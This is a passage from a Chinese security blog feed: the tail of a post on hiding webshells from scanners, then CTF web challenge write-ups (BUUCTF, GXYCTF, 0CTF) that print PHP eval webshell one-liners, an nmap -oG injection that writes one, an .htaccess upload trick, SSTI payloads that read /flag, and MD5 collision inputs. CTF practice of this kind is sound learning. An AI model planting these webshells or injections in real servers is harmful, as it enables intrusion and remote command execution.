        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><p>此篇针对webshell的免杀进行一系列的研究分享(持续更新)</p><h2 id="Bypass思路："><a href="#Bypass思路：" class="headerlink" title="Bypass思路："></a>Bypass思路：</h2><h3 id="1-静态免杀"><a href="#1-静态免杀" class="headerlink" title="1.静态免杀"></a>1.静态免杀</h3><p>其主要是根据对你上传的东西进行简单的扫描，例如D盾，想要绕过这种免杀，基本就是将关键字进行一个隐藏就可以了</p><h4 id="1-1由一道题目引发的免杀思路：-CISCN-2019-初赛-Love-Math"><a href="#1-1由一道题目引发的免杀思路：-CISCN-2019-初赛-Love-Math" class="headerlink" title="1.1由一道题目引发的免杀思路：[CISCN 2019 初赛]Love Math"></a>1.1由一道题目引发的免杀思路：[CISCN 2019 初赛]Love Math</h4><p>此题目中利用了白名单，黑名单来实现静态检测，但是由于可以get到源码，同时又是一道ctf题目所以可以get到基本考点</p><p>主要函数利用：</p><p>base_convert() 函数：在任意进制之间转换数字。<br>dechex() 函数：把十进制转换为十六进制。<br>hex2bin() 函数：把十六进制值的字符串转换为 ASCII 字符。</p><p>这三个函数的结合就可以实现任意字符的转换，这就是我要说的免杀的第一个思路：利用编码机制来实现bypass</p><p>原来的样子：</p><pre><code>$_GET[a]($_GET[b]);</code></pre><h3 id="2-动态免杀"><a href="#2-动态免杀" class="headerlink" title="2.动态免杀"></a>2.动态免杀</h3><p>根据你与服务端交互的流量进行分析，目前的大部分waf都具有此功能，其功能就像wireshark的原理一样</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> webshell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Buuctf之Web(二)</title>
      <link href="/2021/05/23/buuctf-zhi-web-er/"/>
      <url>/2021/05/23/buuctf-zhi-web-er/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=1846317550&auto=1&height=66"></iframe><h1 id="2021-5-23"><a href="#2021-5-23" class="headerlink" title="2021-5-23"></a>2021-5-23</h1><h2 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h2><h3 id="题目："><a href="#题目：" class="headerlink" title="题目："></a>题目：</h3><pre class="line-numbers language-php"><code class="language-php"> <span class="token delimiter">&lt;?php</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'HTTP_X_FORWARDED_FOR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'HTTP_X_FORWARDED_FOR'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>     <span class="token variable">$host</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>     <span class="token variable">$host</span> <span class="token operator">=</span> <span class="token function">escapeshellarg</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token variable">$host</span> <span class="token operator">=</span> <span class="token function">escapeshellcmd</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token variable">$sandbox</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token string">"glzjin"</span><span class="token punctuation">.</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">echo</span> <span class="token string">'you are in sandbox '</span><span class="token punctuation">.</span><span class="token variable">$sandbox</span><span class="token punctuation">;</span>     @<span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">chdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">echo</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"nmap -T5 -sT -Pn --host-timeout 2 -F "</span><span class="token punctuation">.</span><span class="token variable">$host</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="补充知识："><a href="#补充知识：" class="headerlink" title="补充知识："></a>补充知识：</h3><h4 id="escapeshellarg函数："><a href="#escapeshellarg函数：" class="headerlink" title="escapeshellarg函数："></a>escapeshellarg函数：</h4><p>(PHP 4 &gt;= 4.0.3, PHP 5, PHP 7, PHP 8)</p><p>escapeshellarg — 把字符串转码为可以在 shell 命令里使用的参数；</p><p><strong>escapeshellarg()</strong> 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，并且还是确保安全的。对于用户输入的部分参数就应该使用这个函数。shell 函数包含 <a href="https://www.php.net/manual/zh/function.exec.php" target="_blank" rel="noopener">exec()</a>, <a href="https://www.php.net/manual/zh/function.system.php" target="_blank" rel="noopener">system()</a> <a href="https://www.php.net/manual/zh/language.operators.execution.php" target="_blank" rel="noopener">执行运算符</a> 。</p><p>例子：</p><pre><code> &lt;?php system(&#39;ls &#39;.escapeshellarg($dir)); ?&gt;</code></pre><h3 id="escapeshellcmd函数："><a href="#escapeshellcmd函数：" class="headerlink" title="escapeshellcmd函数："></a>escapeshellcmd函数：</h3><p>(PHP 4, PHP 5, PHP 7, PHP 8)</p><p>escapeshellcmd — shell 元字符转义</p><p><strong>escapeshellcmd()</strong> 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 <a href="https://www.php.net/manual/zh/function.exec.php" target="_blank" rel="noopener">exec()</a> 或 <a href="https://www.php.net/manual/zh/function.system.php" target="_blank" rel="noopener">system()</a> 函数，或者 <a href="https://www.php.net/manual/zh/language.operators.execution.php" target="_blank" rel="noopener">执行操作符</a> 之前进行转义。</p><p>反斜线（\）会在以下字符之前插入： <code>&amp;#;</code>|*?~&lt;&gt;^()[]{}$`,<code>\x0A</code>和<code>\xFF</code>。<code>&#39;</code>和<code>&quot;</code>仅在不配对儿的时候被转义。 在 Windows 平台上，所有这些字符以及%`和! 字符都会被空格代替。</p><h4 id="利用-绕过-PHP-escapeshellarg-escapeshellcmd函数："><a href="#利用-绕过-PHP-escapeshellarg-escapeshellcmd函数：" class="headerlink" title="利用/绕过 PHP escapeshellarg/escapeshellcmd函数："></a><a href="https://zhuanlan.zhihu.com/p/36602107" target="_blank" rel="noopener">利用/绕过 PHP escapeshellarg/escapeshellcmd函数：</a></h4><p>escapeshellarg和escapeshellcmd的功能 escapeshellarg 1.确保用户只传递一个参数给命令 2.用户不能指定更多的参数一个 3.用户不能执行不同的命令</p><p>escapeshellcmd 1.确保用户只执行一个命令 2.用户可以指定不限数量的参数 3.用户不能执行不同的命令</p><h4 id="chdir-函数："><a href="#chdir-函数：" class="headerlink" title="chdir()函数："></a>chdir()函数：</h4><p>新建一个目录</p><h3 id="解题："><a href="#解题：" class="headerlink" title="解题："></a>解题：</h3><p>首先请求头里面要有X_FORWARDED_FOR，有的话会被变成REMOTE_ADDR</p><p>get传入参数host，这里用该就是传入ip</p><p>看了看<a href="https://paper.seebug.org/164/" target="_blank" rel="noopener">PHP escapeshellarg()+escapeshellcmd() 之殇</a>(一个很强的技术站点)</p><p>然后配合这篇文章才能完全理解哈：</p><p><a href="http://www.lmxspace.com/2018/07/16/谈谈escapeshellarg参数绕过和注入的问题/" target="_blank" rel="noopener">谈谈escapeshellarg参数绕过和注入的问题 (lmxspace.com)</a></p><p>这时候搜索可以发现在nmap命令中 有一个参数-oG可以实现将命令和结果写到文件</p><p>这个命令就是我们的输入可控！然后写入到文件！OK很自然的想到了上传一个一句话木马了,或者直接查看flag</p><pre><code>?host=&#39;&lt;?php @eval($_POST[&quot;a&quot;]);?&gt; -oG 1.php &#39;</code></pre><p>注意这里的a需要用双引号来包裹起来</p><p>执行后会返回文件夹名</p><h2 id="GXYCTF2019-BabyUpload"><a href="#GXYCTF2019-BabyUpload" class="headerlink" title="[GXYCTF2019]BabyUpload"></a>[GXYCTF2019]BabyUpload</h2><p>考查点为.htaccess</p><pre><code>&lt;FilesMatch &quot;a.jpg&quot;&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt;</code></pre><p>a.jpg为准备的图片</p><p>1.php：</p><pre><code>&lt;script language=&quot;php&quot;&gt;eval($_POST[&#39;a&#39;]);&lt;/script&gt;</code></pre><p>在命令行里面制作一句话木马</p><pre><code>copy a.jpg/b + 1.php/a h</code></pre><h2 id="强网杯-2019-Web-高明的黑客"><a href="#强网杯-2019-Web-高明的黑客" class="headerlink" title="强网杯-2019-Web-高明的黑客"></a>强网杯-2019-Web-高明的黑客</h2><p>给了一大堆php后门文件，要用脚本去跑可以用的文件</p><p>木马：xk0SzyKwfzw.php?Efa5BVG=cat /flag</p><p>Efa5BVG</p><h1 id="2021-5-26"><a href="#2021-5-26" class="headerlink" title="2021-5-26"></a>2021-5-26</h1><h2 id="安洵杯-2019-easy-web"><a href="#安洵杯-2019-easy-web" class="headerlink" title="[安洵杯 2019]easy_web"></a>[安洵杯 2019]easy_web</h2><p>将url中img参数base64解码2次后hex解码一次，得到5.png</p><p>同理得到index.php源码，将得到base64密文解码，得到如下(已将多余的代码删除了)：</p><pre class="line-numbers language-php+html"><code class="language-php+html"><?php$cmd = $_GET['cmd'];if (!isset($_GET['img']) || !isset($_GET['cmd']))     header('Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&cmd=');$file = hex2bin(base64_decode(base64_decode($_GET['img'])));$file = preg_replace("/[^a-zA-Z0-9.]+/", "", $file);if (preg_match("/flag/i", $file)) {    echo '<img src ="./ctf3.jpeg">';    die("xixi～ no flag");} else {    $txt = base64_encode(file_get_contents($file));    echo "<img src='data:image/gif;base64," . $txt . "'></img>";    echo "<br>";}echo $cmd;echo "<br>";if (preg_match("/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\{|\}|\(|\)|\&[^\d]|@|\||\\$|\[|\]|{|}|\(|\)|-|<|>/i", $cmd)) {    echo("forbid ~");    echo "<br>";} else {    if ((string)$_POST['a'] !== (string)$_POST['b'] && md5($_POST['a']) === md5($_POST['b'])) {        echo `$cmd`;    } else {        echo ("md5 is funny ~");    }}?><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>主要考点：</p><p>因为这是<a href="https://www.cnblogs.com/hacker-snail/p/13955722.html" target="_blank" rel="noopener">md5强碰撞</a>所以数组是无法绕过的，对于需要两个内容不同但是MD5值相同的文件，使用Fastcoll就可以了</p><p><a href="https://blog.csdn.net/CSDNiamcoming/article/details/108837347?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522162202082216780264012739%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=162202082216780264012739&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~baidu_landing_v2~default-1-108837347.first_rank_v2_pc_rank_v29&utm_term=md5%E5%BC%BA%E7%B1%BB%E5%9E%8B%E6%AF%94%E8%BE%83&spm=1018.2226.3001.4187" target="_blank" rel="noopener">总结ctf中 MD5 绕过的一些思路</a></p><pre><code>a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</code></pre><p>注意点：</p><p>需要用火狐来进行post的数据传参数，然后来抓包，并且修改post传出的数据，然后利用sort命令来绕过cat的过滤</p><h1 id="2021-5-27-SSTI学习"><a href="#2021-5-27-SSTI学习" class="headerlink" title="2021-5-27(SSTI学习)"></a>2021-5-27(<a href="https://www.cnblogs.com/cioi/p/12308518.html" target="_blank" rel="noopener">SSTI学习</a>)</h1><h2 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h2><p>针对<a href="https://blog.csdn.net/weixin_44604541/article/details/109048578" target="_blank" rel="noopener">ssti模板</a>注入，导致此类问题被利用主要是程序员对代码的不严谨没导致注入点的暴露，使攻击者利用模板引擎来实现攻击</p><p>主要的框架</p><ul><li>Python：jinja2、 mako、 tornado、 django</li><li>php：smarty、 twig</li><li>java：jade、 velocity</li></ul><p>而此题的注入点存在于决定于ip的xff中</p><p>而这里的模板引擎为twig(利用7*7来判断)</p><p>所以利用system函数进行shell的交互操作</p><p>在请求头构造xff:</p><pre><code>{{system("ls")}}{{system("cat /flag")}}</code></pre><p>即可得到flag</p><h2 id="BJDCTF-2nd-fake-google"><a href="#BJDCTF-2nd-fake-google" class="headerlink" title="[BJDCTF 2nd]fake google"></a>[BJDCTF 2nd]fake google</h2><p>利用tplmap来实现ssti模板注入</p><p><a href="https://www.cnblogs.com/LEOGG321/p/13441283.html" target="_blank" rel="noopener">记一次tplmap的简单使用案例</a></p><p><a href="https://blog.csdn.net/EC_Carrot/article/details/109709767" target="_blank" rel="noopener">Tplmap的安装与用法（内包含解决缺少库报错的处理教程)</a></p><h1 id="2021-05-29-30"><a href="#2021-05-29-30" class="headerlink" title="2021-05-29/30"></a>2021-05-29/30</h1><h2 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a><a href="https://blog.csdn.net/weixin_43818995/article/details/105172871" target="_blank" rel="noopener">[BJDCTF2020]Mark loves cat</a></h2><p>.git泄露：<a href="https://blog.csdn.net/qq1045553189/article/details/86221203" target="_blank" rel="noopener">dirsearch扫描</a>都是推荐低线程哈-s 1，然后githack下载源码</p><p>index.php源码泄露：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">include</span> <span class="token string">'flag.php'</span><span class="token punctuation">;</span><span class="token variable">$yds</span> <span class="token operator">=</span> <span class="token string">"dog"</span><span class="token punctuation">;</span><span class="token variable">$is</span> <span class="token operator">=</span> <span class="token string">"cat"</span><span class="token punctuation">;</span><span class="token variable">$handsome</span> <span class="token operator">=</span> <span class="token string">'yds'</span><span class="token punctuation">;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_POST</span> <span class="token keyword">as</span> <span class="token variable">$x</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$y</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token shell-comment comment">#post出入参数：?test=123将这种格式</span>    $<span class="token variable">$x</span> <span class="token operator">=</span> <span class="token variable">$y</span><span class="token punctuation">;</span> <span class="token shell-comment comment">#若传入x=y，则$x=y</span>    <span class="token variable">$test</span><span class="token operator">=</span><span class="token number">123</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_GET</span> <span class="token keyword">as</span> <span class="token variable">$x</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$y</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    $<span class="token variable">$x</span> <span class="token operator">=</span> $<span class="token variable">$y</span><span class="token punctuation">;</span>   <span class="token shell-comment comment">#若传入x=y，则$x=$y</span>    <span class="token variable">$test</span><span class="token operator">=</span><span class="token variable">$123</span><span class="token punctuation">}</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_GET</span> <span class="token keyword">as</span> <span class="token variable">$x</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$y</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'flag'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token variable">$x</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$x</span> <span class="token operator">!==</span> <span class="token string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token variable">$handsome</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//遍历传入的get参数，当参数的key名不是flag，且key名为flag的value又要等于当前的key，即当存在key!='flag',而flag=key</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'flag'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'flag'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token variable">$yds</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token shell-comment comment">#没有设置flag则进入</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'flag'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string">'flag'</span>  <span class="token operator">||</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'flag'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token variable">$is</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token shell-comment comment">#设置了flag键值即进入</span><span class="token punctuation">}</span><span class="token keyword">echo</span> <span class="token string">"the flag is: "</span><span class="token punctuation">.</span><span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="考点："><a href="#考点：" class="headerlink" title="考点："></a>考点：</h3><p>$$ 导致的变量覆盖问题在CTF代码审计题目中经常在foreach中出现。</p><p>使用foreach来遍历数组中的值，然后再将获取到的数组键名作为变量，数组中的键值作为变量的值。</p><p>因此就产生了变量覆盖漏洞。请求?name=test 会将$name的值覆盖，变为test。</p><p>因为最后一句话表明确确实实存在$flag，所以利用变量覆盖将exit中的任何一个变量变为$flag即可实现flag的输出，所以这里用三种覆盖的选择：</p><h3 id="第一种覆盖-handsome："><a href="#第一种覆盖-handsome：" class="headerlink" title="第一种覆盖$handsome："></a>第一种覆盖$handsome：</h3><p>因为条件矛盾，要求我key值为flag，还要求我key值不能为flag。</p><p>将键值变成为$handsome=flag利用get的覆盖变量后变成$handsome=$flag，此时$handsome的值已经变成了我们需要的flag，然后flag=handsome再来一次覆盖这样$handsome的变量值为flag的值同时$flag也是flag，同时也满足了key值传入的key值为flag 的value等于handsome，同时，而传入的key值为handsome 的也等于flag也就实现了绕过~</p><h3 id="第二种覆盖-yds："><a href="#第二种覆盖-yds：" class="headerlink" title="第二种覆盖$yds："></a>第二种覆盖$yds：</h3><p>不论是get还是post传参key值都不能为flag，这是可以出现这种形式：$yds=$flag，也就是利用所说的变量覆盖，来实现$flag的调用</p><h3 id="第三种覆盖-is："><a href="#第三种覆盖-is：" class="headerlink" title="第三种覆盖$is："></a>第三种覆盖$is：</h3><p>要求post传入的key值为flag或者get传入的key值为flag。所以利用get进行覆盖：flag=flag&amp;is=flag，利用$flag把$is给覆盖</p><p>而此题主要利用的覆盖点在于$$x=$$y</p><h1 id="2021-05-31"><a href="#2021-05-31" class="headerlink" title="2021-05-31"></a>2021-05-31</h1><h2 id="0CTF-2016-piapiapia"><a href="#0CTF-2016-piapiapia" class="headerlink" title="[0CTF 2016]piapiapia"></a>[0CTF 2016]piapiapia</h2><p>扫盲：</p><p><a href="https://www.runoob.com/php/func-string-implode.html" target="_blank" rel="noopener">PHP implode() 函数</a>：将数组中的内容，用函数中的第一个值来分割开</p><p>1.dirsearch扫描得到<a href="http://www.zip文件" target="_blank" rel="noopener">www.zip文件</a></p><pre><code>python3 dirsearch.py -u &quot;http://af94cb62-af25-4728-b6bf-3f1c475f72a4.node3.buuoj.cn/&quot; -e * -s 1</code></pre><p>2.利用代码审计工具扫一下发现在profile.php中存在文件读取</p><pre class="line-numbers language-php+html"><code class="language-php+html"><?php    require_once('class.php');    if($_SESSION['username'] == null) {        die('Login First');        }    $username = $_SESSION['username'];    $profile=$user->show_profile($username);    if($profile  == null) {        header('Location: update.php');    }    else {        $profile = unserialize($profile); //反序列化漏洞        $phone = $profile['phone'];        $email = $profile['email'];        $nickname = $profile['nickname'];        $photo = base64_encode(file_get_contents($profile['photo'])); //文件读取?><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>也就是$photo这个地方存在文件读取</p><p>同时经过审计也存在反序列化在第12行</p><p>3.说updata.php中存在文件上传，但是经过分析文件上传名字经过md5加密，且上传成功后不返回加密信息</p><pre class="line-numbers language-php+html"><code class="language-php+html"><?php    require_once('class.php');    if($_SESSION['username'] == null) {        die('Login First');        }    if($_POST['phone'] && $_POST['email'] && $_POST['nickname'] && $_FILES['photo']) {        $username = $_SESSION['username'];        if(!preg_match('/^\d{11}$/', $_POST['phone']))            die('Invalid phone');        if(!preg_match('/^[_a-zA-Z0-9]{1,10}@[_a-zA-Z0-9]{1,10}\.[_a-zA-Z0-9]{1,10}$/', $_POST['email']))            die('Invalid email');        if(preg_match('/[^a-zA-Z0-9_]/', $_POST['nickname']) || strlen($_POST['nickname']) > 10)            die('Invalid nickname');        $file = $_FILES['photo'];        if($file['size'] < 5 or $file['size'] > 1000000)            die('Photo size error');        move_uploaded_file($file['tmp_name'], 'upload/' . md5($file['name']));        $profile['phone'] = $_POST['phone'];        $profile['email'] = $_POST['email'];        $profile['nickname'] = $_POST['nickname'];        $profile['photo'] = 'upload/' . md5($file['name']);//文件上传，文件读取的利用点        $user->update_profile($username, serialize($profile));//出现序列化，同时需要利用update_profile函数        echo 'Update Profile Success!<a href="profile.php">Your Profile</a>';    }    else {?><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>4.跟踪update_profile函数</p><p>parent::调用父类方法(构造函数)</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">require</span><span class="token punctuation">(</span><span class="token string">'config.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">update_profile</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$new_profile</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">//跟进update_profile函数</span>        <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token keyword">parent</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$new_profile</span> <span class="token operator">=</span> <span class="token keyword">parent</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$new_profile</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$where</span> <span class="token operator">=</span> <span class="token string">"username = '$username'"</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token keyword">parent</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">update</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">table</span><span class="token punctuation">,</span> <span class="token string">'profile'</span><span class="token punctuation">,</span> <span class="token variable">$new_profile</span><span class="token punctuation">,</span> <span class="token variable">$where</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">//跟进filter函数</span>        <span class="token variable">$escape</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'\''</span><span class="token punctuation">,</span> <span class="token string">'\\\\'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$escape</span> <span class="token operator">=</span> <span class="token string">'/'</span> <span class="token punctuation">.</span> <span class="token function">implode</span><span class="token punctuation">(</span><span class="token string">'|'</span><span class="token punctuation">,</span> <span class="token variable">$escape</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'/'</span><span class="token punctuation">;</span>        <span class="token variable">$string</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token variable">$escape</span><span class="token punctuation">,</span> <span class="token string">'_'</span><span class="token punctuation">,</span> <span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$safe</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'select'</span><span class="token punctuation">,</span> <span class="token string">'insert'</span><span class="token punctuation">,</span> <span class="token string">'update'</span><span class="token punctuation">,</span> <span class="token string">'delete'</span><span class="token punctuation">,</span> <span class="token string">'where'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$safe</span> <span class="token operator">=</span> <span class="token string">'/'</span> <span class="token punctuation">.</span> <span class="token function">implode</span><span class="token punctuation">(</span><span class="token string">'|'</span><span class="token punctuation">,</span> <span class="token variable">$safe</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'/i'</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token variable">$safe</span><span class="token punctuation">,</span> <span class="token string">'hacker'</span><span class="token punctuation">,</span> <span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>5.config.php中有flag变量(但是这只是本地也就是客户端的，而真正的flag存在于服务端的config.php文件中)：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string">'hostname'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'127.0.0.1'</span><span class="token punctuation">;</span>    <span class="token variable">$config</span><span 